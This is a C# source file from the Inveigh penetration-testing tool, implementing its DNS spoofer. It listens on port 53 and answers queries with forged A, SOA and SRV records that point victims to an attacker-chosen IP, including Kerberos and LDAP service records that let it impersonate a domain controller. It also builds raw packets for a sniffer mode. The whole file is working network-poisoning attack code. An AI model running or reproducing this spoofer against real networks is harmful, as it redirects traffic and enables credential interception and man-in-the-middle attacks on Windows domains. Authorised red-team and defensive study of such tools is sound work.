using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.IO;

namespace Inveigh
{
    class DNS
    {

        public static void DNSListener(string IP, string spooferIP, string dnsTTL, string dnsDomainController, string ipVersion, string[] dnsTypes)
        {
            byte[] spooferIPData = IPAddress.Parse(spooferIP).GetAddressBytes();
            byte[] ttlDNS = BitConverter.GetBytes(Int32.Parse(dnsTTL));
            Array.Reverse(ttlDNS);
            IPAddress dnsListenerIP = IPAddress.Any;

            if (String.Equals(ipVersion, "IPv6"))
            {
                dnsListenerIP = IPAddress.IPv6Any;
            }

            IPEndPoint dnsEndpoint = new IPEndPoint(dnsListenerIP, 53);
            IPAddress destinationIPAddress = IPAddress.Parse(IP);
            UdpClient dnsClient = UDP.UDPListener("DNS", IP, 53, ipVersion);

            while (!Program.exitInveigh)
            {

                try
                {
                    byte[] udpPayload = dnsClient.Receive(ref dnsEndpoint);
                    int dnsSourcePort = dnsEndpoint.Port;              
                    string dnsRequestHost = Util.ParseNameQuery(12, udpPayload);
                    byte[] dnsRequest = new byte[dnsRequestHost.Length + 2];
                    System.Buffer.BlockCopy(udpPayload, 12, dnsRequest, 0, dnsRequest.Length);
                    IPAddress sourceIPAddress = dnsEndpoint.Address;
                    byte[] dnsRequestRecordType = new byte[2];
                    Buffer.BlockCopy(udpPayload, (dnsRequest.Length + 12), dnsRequestRecordType, 0, 2);
                    string dnsRecordType = Util.GetRecordType(dnsRequestRecordType);
                    string dnsResponseMessage = Util.CheckRequest(dnsRequestHost, sourceIPAddress.ToString(), IP.ToString(), "DNS", dnsRecordType, dnsTypes);

                    if (Program.enabledDNS && String.Equals(dnsResponseMessage, "response sent"))
                    {
                        byte[] dnsResponse = DNS.GetDNSResponse("listener", ipVersion, dnsDomainController, dnsTTL, dnsRecordType, sourceIPAddress, destinationIPAddress, spooferIPData, Util.IntToByteArray2(dnsSourcePort), udpPayload);
                        IPEndPoint dnsDestinationEndPoint = new IPEndPoint(sourceIPAddress, dnsSourcePort);
                        UDP.UDPListenerClient(sourceIPAddress, dnsSourcePort, dnsClient, dnsResponse);
                        dnsClient = UDP.UDPListener("DNS", IP, 53, ipVersion);
                    }

                    lock (Program.outputList)
                    {
                        Program.outputList.Add(String.Format("[+] [{0}] DNS({1}) request for {2} from {3} [{4}]", DateTime.Now.ToString("s"), dnsRecordType, dnsRequestHost, sourceIPAddress, dnsResponseMessage));
                    }

                }
                catch (Exception ex)
                {

                    lock (Program.outputList)
                    {
                        Program.outputList.Add(String.Format("[-] [{0}] DNS spoofer error detected - {1}", DateTime.Now.ToString("s"), ex.ToString()));

                    }

                }

            }

        }

        public static byte[] GetDNSResponse(string type, string ipVersion, string dnsHost, string dnsTTL, string dnsRecordType, IPAddress sourceIPAddress,  IPAddress destinationIPAddress, byte[] spooferIPData, byte[] udpSourcePort, byte[] udpPayload)
        {
            Array.Reverse(udpSourcePort);
            byte[] ttlDNS = BitConverter.GetBytes(Int32.Parse(dnsTTL));
            Array.Reverse(ttlDNS);
            byte[] dnsTransactionID = new byte[2];
            System.Buffer.BlockCopy(udpPayload, 0, dnsTransactionID, 0, 2);
            string dnsRequestHost = Util.ParseNameQuery(12, udpPayload);
            byte[] dnsRequest = new byte[dnsRequestHost.Length + 2];
            System.Buffer.BlockCopy(udpPayload, 12, dnsRequest, 0, dnsRequest.Length);
            string[] dnsRequestSplit = dnsRequestHost.Split('.');
            int headerLength = 0;
            string dnsHostSplit = "";
            byte[] dnsHostData = new byte[0];
            string dnsHostDomain = "";
            int dnsDomainLocation = 12;
            int dcLocation = 0;
            byte[] dnsHostFullData = new byte[0];

            if (!String.IsNullOrEmpty(dnsHost))
            {
                dnsHostSplit = dnsHost.Split('.')[0];
                dnsHostData = Util.NewDNSNameArray(dnsHostSplit, false);
                dnsHostDomain = dnsHost.Substring(dnsHostSplit.Length + 1);
                dnsHostFullData = Util.NewDNSNameArray(dnsHost, true);

                if (dnsRequestHost.EndsWith(dnsHostDomain))
                {
                    dnsDomainLocation += dnsRequestHost.Length - dnsHostDomain.Length;
                }

            }

            MemoryStream dnsMemoryStream = new MemoryStream();

            if (String.Equals(type, "sniffer"))
            {
                dnsMemoryStream.Write((new byte[2] { 0x00, 0x35 }), 0, 2);
                dnsMemoryStream.Write(udpSourcePort, 0, 2);
                dnsMemoryStream.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
                dnsMemoryStream.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
                headerLength = 8;
            }

            if ((int)udpPayload[2] != 40)
            {

                switch (dnsRecordType)
                {

                    case "A":
                        dnsMemoryStream.Write(dnsTransactionID, 0, dnsTransactionID.Length);
                        dnsMemoryStream.Write((new byte[10] { 0x80, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00 }), 0, 10);
                        dnsMemoryStream.Write(dnsRequest, 0, dnsRequest.Length);
                        dnsMemoryStream.Write((new byte[4] { 0x00, 0x01, 0x00, 0x01 }), 0, 4);
                        dnsMemoryStream.Write((new byte[2] { 0xc0, 0x0c }), 0, 2);
                        dnsMemoryStream.Write((new byte[4] { 0x00, 0x01, 0x00, 0x01 }), 0, 4);
                        break;

                    case "SOA":
                        dnsMemoryStream.Write(dnsTransactionID, 0, dnsTransactionID.Length);
                        dnsMemoryStream.Write((new byte[10] { 0x85, 0x80, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01 }), 0, 10);
                        dnsMemoryStream.Write(dnsRequest, 0, dnsRequest.Length);
                        dnsMemoryStream.Write((new byte[4] { 0x00, 0x06, 0x00, 0x01 }), 0, 4);
                        dnsMemoryStream.Write((new byte[2] { 0xc0, 0x0c }), 0, 2);
                        dnsMemoryStream.Write((new byte[4] { 0x00, 0x06, 0x00, 0x01 }), 0, 4);
                        dnsMemoryStream.Write(ttlDNS, 0, 4);
                        dnsMemoryStream.Write(Util.IntToByteArray2(dnsHostData.Length + 35), 0, 2);
                        dcLocation = (int) dnsMemoryStream.Length - headerLength;
                        dnsMemoryStream.Write(dnsHostData, 0, dnsHostData.Length);
                        dnsMemoryStream.Write((new byte[1] { 0xc0 }), 0, 1);
                        dnsMemoryStream.Write(BitConverter.GetBytes(dnsDomainLocation), 0, 1);
                        dnsMemoryStream.Write((new byte[11] { 0x0a, 0x68, 0x6f, 0x73, 0x74, 0x6d, 0x61, 0x73, 0x74, 0x65, 0x72 }), 0, 11);
                        dnsMemoryStream.Write((new byte[1] { 0xc0 }), 0, 1);
                        dnsMemoryStream.Write(BitConverter.GetBytes(dnsDomainLocation), 0, 1);
                        dnsMemoryStream.Write((new byte[4] { 0x00, 0x00, 0x06, 0x58 }), 0, 4);
                        dnsMemoryStream.Write((new byte[4] { 0x00, 0x00, 0x03, 0x84 }), 0, 4);
                        dnsMemoryStream.Write((new byte[4] { 0x00, 0x00, 0x02, 0x58 }), 0, 4);
                        dnsMemoryStream.Write((new byte[4] { 0x00, 0x01, 0x51, 0x80 }), 0, 4);
                        dnsMemoryStream.Write(ttlDNS, 0, 4);
                        dnsMemoryStream.Write((new byte[1] { 0xc0 }), 0, 1);
                        dnsMemoryStream.Write(BitConverter.GetBytes(dcLocation), 0, 1);
                        dnsMemoryStream.Write((new byte[4] { 0x00, 0x01, 0x00, 0x01 }), 0, 4);
                        break;

                    case "SRV":
                        dnsMemoryStream.Write(dnsTransactionID, 0, dnsTransactionID.Length);
                        dnsMemoryStream.Write((new byte[10] { 0x85, 0x80, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01 }), 0, 10);
                        dnsMemoryStream.Write(dnsRequest, 0, dnsRequest.Length);
                        dnsMemoryStream.Write((new byte[4] { 0x00, 0x21, 0x00, 0x01 }), 0, 4);
                        dnsMemoryStream.Write((new byte[2] { 0xc0, 0x0c }), 0, 2);
                        dnsMemoryStream.Write((new byte[4] { 0x00, 0x21, 0x00, 0x01 }), 0, 4);
                        dnsMemoryStream.Write(ttlDNS, 0, 4);
                        dnsMemoryStream.Write(Util.IntToByteArray2(dnsHostData.Length + 6), 0, 2);
                        dnsMemoryStream.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
                        dnsMemoryStream.Write((new byte[2] { 0x00, 0x65 }), 0, 2);

                        switch (dnsRequestSplit[0])
                        {

                            case "_kerberos":
                                 dnsMemoryStream.Write((new byte[2] { 0x00, 0x58 }), 0, 2);
                                break;

                            case "_ldap":
                                 dnsMemoryStream.Write((new byte[2] { 0x01, 0x85 }), 0, 2);
                                break;

                        }

                        dcLocation = (int)dnsMemoryStream.Length - headerLength;
                        dnsMemoryStream.Write(dnsHostFullData, 0, dnsHostFullData.Length);
                        dnsMemoryStream.Write((new byte[1] { 0xc0 }), 0, 1);
                        dnsMemoryStream.Write(BitConverter.GetBytes(dcLocation), 0, 1);
                        dnsMemoryStream.Write((new byte[4] { 0x00, 0x01, 0x00, 0x01 }), 0, 4);
                        break;
                }

                 dnsMemoryStream.Write(ttlDNS, 0, 4);
                 dnsMemoryStream.Write((new byte[2] { 0x00, 0x04 }), 0, 2);
                 dnsMemoryStream.Write(spooferIPData, 0, spooferIPData.Length);

                if (String.Equals(type, "sniffer"))
                {
                     dnsMemoryStream.Position = 4;
                     dnsMemoryStream.Write(Util.IntToByteArray2((int) dnsMemoryStream.Length), 0, 2);
                }

                if (String.Equals(type, "sniffer") && String.Equals(ipVersion, "IPv6"))
                {
                    byte[] dnsPseudoHeader = Util.GetIPv6PseudoHeader(destinationIPAddress, sourceIPAddress, 17, (int) dnsMemoryStream.Length);
                    UInt16 checkSum = Util.GetPacketChecksum(dnsPseudoHeader,  dnsMemoryStream.ToArray());
                    dnsMemoryStream.Position = 6;
                    byte[] packetChecksum = Util.IntToByteArray2(checkSum);
                    Array.Reverse(packetChecksum);
                    dnsMemoryStream.Write(packetChecksum, 0, 2);
                }

            }
            else
            {
                byte[] flags = new byte[2] { 0xa8, 0x05 };
                byte[] dnsPayload = new byte[udpPayload.Length - 2];
                System.Buffer.BlockCopy(udpPayload, 2, dnsPayload, 0, dnsPayload.Length);
                dnsMemoryStream.Write(udpPayload, 0, udpPayload.Length);

                if (String.Equals(type, "sniffer"))
                {
                     dnsMemoryStream.Position = 10;
                     dnsMemoryStream.Write(flags, 0, 2);
                     dnsMemoryStream.Position = 4;
                     dnsMemoryStream.Write(Util.IntToByteArray2((int) dnsMemoryStream.Length), 0, 2);
                }
                else
                {
                     dnsMemoryStream.Position = 2;
                     dnsMemoryStream.Write(flags, 0, 2);
                }

            }

            return  dnsMemoryStream.ToArray();
        }

    }

}
